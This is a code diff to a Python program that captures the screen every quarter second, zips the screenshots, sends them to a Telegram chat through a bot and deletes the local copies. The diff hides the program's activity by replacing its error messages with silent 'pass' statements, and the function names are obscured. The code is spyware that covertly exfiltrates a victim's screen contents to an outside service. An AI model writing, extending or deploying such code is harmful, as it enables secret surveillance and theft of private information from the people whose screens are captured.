@@ -31,7 +31,7 @@ def cpt_sct(save_path):
         img = img.convert('RGB')
         img.save(save_path, format='PNG', optimize=True)
     except Exception as e:
-        print(f"Error capturing screenshot: {e}")
+        pass
 
 def crt_z(screenshot_files, zip_path):
     try:
@@ -40,7 +40,7 @@ def crt_z(screenshot_files, zip_path):
                 if os.path.exists(file):
                     zipf.write(file, os.path.basename(file))
     except Exception as e:
-        print(f"Error creating zip: {e}")
+        pass
 
 async def snd_telg(zip_path, retries=3):
     if not os.path.exists(zip_path):
@@ -52,7 +52,6 @@ async def snd_telg(zip_path, retries=3):
             await bot.send_document(chat_id=CHAT_ID, document=document)
             return True
         except Exception as e:
-            print(f"Telegram send attempt {attempt} failed: {e}")
             if attempt < retries:
                 await asyncio.sleep(5)
     return False
@@ -86,18 +85,18 @@ def kdjfhg_dfgdfg(temp_dir):
                         if os.path.exists(file):
                             os.remove(file)
                     except OSError as e:
-                        print(f"Error removing screenshot file: {e}")
+                        pass
                 try:
                     if os.path.exists(zip_path):
                         os.remove(zip_path)
                 except OSError as e:
-                    print(f"Error removing zip file: {e}")
+                    pass
 
                 screenshot_files = []
                 last_send_time = current_time
 
         except Exception as e:
-            print(f"Main loop error: {e}")
+            pass
 
         time.sleep(0.25)
 
